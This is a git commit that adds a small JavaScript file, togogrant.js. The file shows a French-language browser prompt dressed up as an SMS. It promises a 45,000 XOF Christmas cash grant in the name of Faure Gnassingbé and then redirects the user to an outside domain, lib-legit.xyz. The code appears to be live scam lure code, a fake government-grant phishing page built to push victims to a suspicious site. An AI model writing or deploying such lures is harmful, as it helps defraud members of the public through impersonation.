ea2478b10fbf4a2f04882b74bb4290970bdc2a17
bigetijazz17 <bigetijazz17@gmail.com>
2024-11-30 16:15:26 -0800

    Create togogrant.js

---
+++ togogrant.js
@@ -0,0 +1,6 @@
+
+var password = 'RECLAMER 45,000 XOF'
+password=prompt('SMS: Félicitations, vous êtes admissible à FAURE GNASSINGBÉ 45,000 XOF SUBVENTION EN ESPÈCES DE NOËL POUR TOUS, Veuillez appuyer sur OK pour RECLAMER Prix ​​en espèces','RECLAMER 45,000 XOF');
+if (password != 'RECLAMER 45,000 XOF') {
+location.href='https://www.lib-legit.xyz/Retirer-45000XOF';
+}
